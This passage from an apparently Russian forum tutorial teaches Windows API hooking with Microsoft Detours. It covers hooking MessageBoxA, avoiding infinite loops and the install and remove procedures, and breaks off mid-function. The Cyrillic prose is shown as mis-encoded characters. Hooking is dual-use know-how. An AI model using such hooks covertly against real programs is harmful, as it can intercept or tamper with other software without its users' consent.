<li data-xf-list-type="ul">DetourTransactionBegin - –Ω–∞—á–∞—Ç—å –Ω–æ–≤—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏–ª–∏ —É–¥–∞–ª–µ–Ω–∏—è –æ–±—Ö–æ–¥–Ω—ã—Ö –ø—É—Ç–µ–π. –≠—Ç—É —Ñ—É–Ω–∫—Ü–∏—é —Å–ª–µ–¥—É–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å –ø–µ—Ä–≤–æ–π –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Ö—É–∫–∞.</li>
<li data-xf-list-type="ul">DetourUpdateThread - –æ–±–Ω–æ–≤–∏—Ç—å —Ç–µ–∫—É—â—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é. –≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π Detours –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –≤ —Ç–µ–∫—É—â—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é.</li>
<li data-xf-list-type="ul">DetourAttach - —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ö—É–∫ –Ω–∞ —Ü–µ–ª–µ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é –≤ —Ç–µ–∫—É—â–µ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏. –≠—Ç–æ –Ω–µ –±—É–¥–µ—Ç –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–æ, –ø–æ–∫–∞ –Ω–µ –±—É–¥–µ—Ç –≤—ã–∑–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è DetourTransactionCommit.</li>
<li data-xf-list-type="ul">DetourDetach - —É–¥–∞–ª–∏—Ç—å —Ö—É–∫ —Å —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ —Ç–µ–∫—É—â–µ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏. –≠—Ç–æ –Ω–µ –±—É–¥–µ—Ç –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–æ, –ø–æ–∫–∞ –Ω–µ –±—É–¥–µ—Ç –≤—ã–∑–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è DetourTransactionCommit.</li>
<li data-xf-list-type="ul">DetourTransactionCommit - –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Ç–µ–∫—É—â—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏–ª–∏ —É–¥–∞–ª–µ–Ω–∏—è –æ–±—Ö–æ–¥–Ω—ã—Ö –ø—É—Ç–µ–π. –í–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–π –≤—ã—à–µ - —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ LONG, –∫–æ—Ç–æ—Ä–æ–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏. API Detours –≤–µ—Ä–Ω–µ—Ç NO_ERROR, –∫–æ—Ç–æ—Ä–æ–µ —Ä–∞–≤–Ω–æ 0, –µ—Å–ª–∏ –æ–Ω–∞ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —É—Å–ø–µ—à–Ω–æ, –∏ –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏. –ù–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –∫–∞–∫ –∫–æ–¥ –æ—à–∏–±–∫–∏ –¥–ª—è —Ü–µ–ª–µ–π –æ—Ç–ª–∞–¥–∫–∏.</li>
</ul><b>–ó–∞–º–µ–Ω–∞ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–æ–≥–æ API </b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∑–∞–º–µ–Ω—ã –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–æ–≥–æ API. –§—É–Ω–∫—Ü–∏—è –∑–∞–º–µ–Ω—ã –¥–æ–ª–∂–Ω–∞ –∏–º–µ—Ç—å —Ç–æ—Ç –∂–µ —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö –∏, –ø–æ –∂–µ–ª–∞–Ω–∏—é, –ø—Ä–∏–Ω–∏–º–∞—Ç—å —Ç–µ –∂–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∏–ª–∏ –∏–∑–º–µ–Ω—è—Ç—å –∑–Ω–∞—á–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å–ª–µ–¥—É—é—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ö–æ–¥–Ω–æ–≥–æ –ø—É—Ç–∏ –¥–ª—è MessageBoxA, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // –º—ã –º–æ–∂–µ–º –ø—Ä–æ–≤–µ—Ä—è—Ç—å hWnd - lpText - lpCaption - –ø–∞—Ä–∞–º–µ—Ç—Ä—ã uType
}</code></pre>
	</div>
</div><br />
–°—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–º–µ–Ω—ã –º–æ–∂–µ—Ç –ø—Ä–∏–Ω–∏–º–∞—Ç—å –º–µ–Ω—å—à–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤, –Ω–æ –Ω–µ –º–æ–∂–µ—Ç –ø—Ä–∏–Ω–∏–º–∞—Ç—å –±–æ–ª—å—à–µ, —á–µ–º –∏—Å—Ö–æ–¥–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –ø–æ—Ç–æ–º—É —á—Ç–æ —Ç–æ–≥–¥–∞ –æ–Ω–∞ –±—É–¥–µ—Ç –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–º—É –∞–¥—Ä–µ—Å—É, —á—Ç–æ –≤—ã–∑–æ–≤–µ—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏—è –Ω–∞—Ä—É—à–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞.<br />
<br />
<b>–ü—Ä–æ–±–ª–µ–º–∞ –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–≥–æ —Ü–∏–∫–ª–∞</b><br />
<br />
–ö–æ–≥–¥–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∏ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è —Ö—É–∫, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –æ–¥–Ω–∞–∫–æ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –≤–µ—Ä–Ω—É—Ç—å –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –∏—Å—Ö–æ–¥–Ω–∞—è –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã–ª–∞ –≤–µ—Ä–Ω—É—Ç—å. –ù–∞–∏–≤–Ω—ã–π –ø–æ–¥—Ö–æ–¥ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å —Ç–æ –∂–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –≤—ã–∑—ã–≤–∞—è –∏—Å—Ö–æ–¥–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –≤–Ω—É—Ç—Ä–∏ —Ö—É–∫–∞. –≠—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ø—Ä–æ–±–ª–µ–º–∞–º, —Ç–∞–∫ –∫–∞–∫ –≤–º–µ—Å—Ç–æ –∑–∞–º–µ–Ω—è—é—â–µ–π —Ñ—É–Ω–∫—Ü–∏–∏ –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∏—Å—Ö–æ–¥–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, <b>—á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–º—É —Ü–∏–∫–ª—É. </b>–≠—Ç–æ –æ–±—â–∞—è –ø—Ä–æ–±–ª–µ–º–∞ —Ö—É–∫–æ–≤ –∏ –Ω–µ –æ—à–∏–±–∫–∞ –≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–µ Detours.<br />
<br />
–î–ª—è –ª—É—á—à–µ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ä–∞—Å—Å–º–æ—Ç—Ä–∏—Ç–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –ø–æ–∫–∞–∑—ã–≤–∞—é—â–∏–π —Ñ—É–Ω–∫—Ü–∏—é –∑–∞–º–µ–Ω—ã MyMessageBoxA, –≤—ã–∑—ã–≤–∞—é—â—É—é MessageBoxA. –≠—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–º—É —Ü–∏–∫–ª—É. –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞—Å—Ç—Ä—è–Ω–µ—Ç –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ MyMessageBoxA, –ø–æ—Ç–æ–º—É —á—Ç–æ MyMessageBoxA –≤—ã–∑—ã–≤–∞–µ—Ç MessageBoxA, –∏ MessageBoxA –≤–µ–¥–µ—Ç –∫ —Ñ—É–Ω–∫—Ü–∏–∏ MyMessageBoxA —Å–Ω–æ–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // –í—ã–≤–æ–¥ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  printf(&quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä lpText    : %s\n&quot;, lpText);
  printf(&quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä lpCaption : %s\n&quot;, lpCaption);

  // –ù–ï –î–ï–õ–ê–ô–¢–ï –¢–ê–ö
  // –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  return MessageBoxA(hWnd, &quot;–¥—Ä—É–≥–æ–π lpText&quot;, &quot;–¥—Ä—É–≥–æ–π lpCaption&quot;, uType); // –í—ã–∑–æ–≤ MessageBoxA (—ç—Ç–æ—Ç —Ö—É–∫ –∞–∫—Ç–∏–≤–µ–Ω)
}</code></pre>
	</div>
</div><br />
<b>–†–µ—à–µ–Ω–∏–µ 1 - –ì–ª–æ–±–∞–ª—å–Ω—ã–π —É–∫–∞–∑–∞—Ç–µ–ª—å</b> <b>–Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é</b><br />
<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours –º–æ–∂–µ—Ç —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, —Å–æ—Ö—Ä–∞–Ω–∏–≤ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –∏—Å—Ö–æ–¥–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –ø–µ—Ä–µ–¥ –µ–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–∏–µ–º. –≠—Ç–æ—Ç —É–∫–∞–∑–∞—Ç–µ–ª—å –º–æ–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –≥–ª–æ–±–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –∏ –≤—ã–∑–≤–∞—Ç—å –≤–º–µ—Å—Ç–æ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ö–æ–¥–Ω–æ–≥–æ –ø—É—Ç–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è MessageBoxA –≤ `MyMessageBoxA`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // –í—ã–≤–æ–¥ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  printf(&quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä lpText    : %s\n&quot;, lpText);
  printf(&quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä lpCaption : %s\n&quot;, lpCaption);

  // –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  // –í—ã–∑–æ–≤ –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–æ–π MessageBoxA
  return g_pMessageBoxA(hWnd, &quot;–¥—Ä—É–≥–æ–π lpText&quot;, &quot;–¥—Ä—É–≥–æ–π lpCaption&quot;, uType);
}</code></pre>
	</div>
</div><br />
<b>–†–µ—à–µ–Ω–∏–µ 2 - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥—Ä—É–≥–æ–≥–æ API </b><br />
<br />
–ï—â–µ –æ–¥–Ω–æ –±–æ–ª–µ–µ –æ–±—â–µ–µ —Ä–µ—à–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ —Å—Ç–æ–∏—Ç —É–ø–æ–º—è–Ω—É—Ç—å, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –≤—ã–∑–æ–≤–µ –¥—Ä—É–≥–æ–π –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –∏–º–µ–µ—Ç —Ç–∞–∫—É—é –∂–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å, –∫–∞–∫ –∏ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è. –ù–∞–ø—Ä–∏–º–µ—Ä, MessageBoxA –∏ MessageBoxW, VirtualAlloc –∏ VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // –í—ã–≤–æ–¥ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  printf(&quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä lpText    : %s\n&quot;, lpText);
  printf(&quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä lpCaption : %s\n&quot;, lpCaption);

  // –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  return MessageBoxW(hWnd, L&quot;–¥—Ä—É–≥–æ–π lpText&quot;, L&quot;–¥—Ä—É–≥–æ–π lpCaption&quot;, uType);
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —Ö—É–∫–∞ Detours</b><br />
<br />
–ö–∞–∫ –±—ã–ª–æ –æ–±—ä—è—Å–Ω–µ–Ω–æ —Ä–∞–Ω–µ–µ, –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ Detours —Ä–∞–±–æ—Ç–∞–µ—Ç —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π, –ø–æ—ç—Ç–æ–º—É –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞ –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é API –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é, –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ (—É—Å—Ç–∞–Ω–æ–≤–∫–∞/—É–¥–∞–ª–µ–Ω–∏–µ —Ö—É–∫–∞) –¥–ª—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏, –∞ –∑–∞—Ç–µ–º –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é. –ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —ç—Ç–∏ —à–∞–≥–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è MessageBoxA –≤ `MyMessageBoxA`
// –ò –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ `DetourAttach` &amp; `DetourDetach`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

// –§—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å—Å—è –≤–º–µ—Å—Ç–æ MessageBoxA –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ö—É–∫–∞
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

    printf(&quot;[+] –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã : \n&quot;);
    printf(&quot;\t - lpText    : %s\n&quot;, lpText);
    printf(&quot;\t - lpCaption    : %s\n&quot;, lpCaption);

    return g_pMessageBoxA(hWnd, &quot;–¥—Ä—É–≥–æ–π lpText&quot;, &quot;–¥—Ä—É–≥–æ–π lpCaption&quot;, uType);
}

BOOL InstallHook() {

    DWORD    dwDetoursErr = NULL;

      // –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∏ –µ—ë –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
    if ((dwDetoursErr = DetourTransactionBegin()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionBegin –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    if ((dwDetoursErr = DetourUpdateThread(GetCurrentThread())) != NO_ERROR) {
        printf(&quot;[!] DetourUpdateThread –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // –ó–∞–ø—É—Å–∫ MyMessageBoxA –≤–º–µ—Å—Ç–æ g_pMessageBoxA, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è MessageBoxA
    if ((dwDetoursErr = DetourAttach((PVOID)&amp;g_pMessageBoxA, MyMessageBoxA)) != NO_ERROR) {
        printf(&quot;[!] DetourAttach –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // –§–∞–∫—Ç–∏—á–µ—Å–∫–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ—Å–ª–µ `DetourTransactionCommit` - –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    if ((dwDetoursErr = DetourTransactionCommit()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionCommit –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —É–¥–∞–ª–µ–Ω–∏—è —Ö—É–∫–∞ Detours</b><br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ç—É –∂–µ –ø—Ä–æ—Ü–µ–¥—É—Ä—É, —á—Ç–æ –∏ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º —Ä–∞–∑–¥–µ–ª–µ, –Ω–æ —ç—Ç–æ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ö—É–∫–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –Ω–µ –ø–æ–¥—Ü–µ–ø–ª–µ–Ω–Ω–∞—è MessageBoxA –≤ `MyMessageBoxA`
// –ò –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ `DetourAttach` &amp; `DetourDetach`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

// –§—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å—Å—è –≤–º–µ—Å—Ç–æ MessageBoxA –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ö—É–∫–∞
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

    printf(&quot;[+] –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã : \n&quot;);
    printf(&quot;\t - lpText    : %s\n&quot;, lpText);
    printf(&quot;\t - lpCaption    : %s\n&quot;, lpCaption);

    return g_pMessageBoxA(hWnd, &quot;–¥—Ä—É–≥–æ–π lpText&quot;, &quot;–¥—Ä—É–≥–æ–π lpCaption&quot;, uType);
}

BOOL Unhook() {

    DWORD    dwDetoursErr = NULL;

      // –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∏ –µ—ë –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
    if ((dwDetoursErr = DetourTransactionBegin()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionBegin –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π —Å –∫–æ–¥–æ–º : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

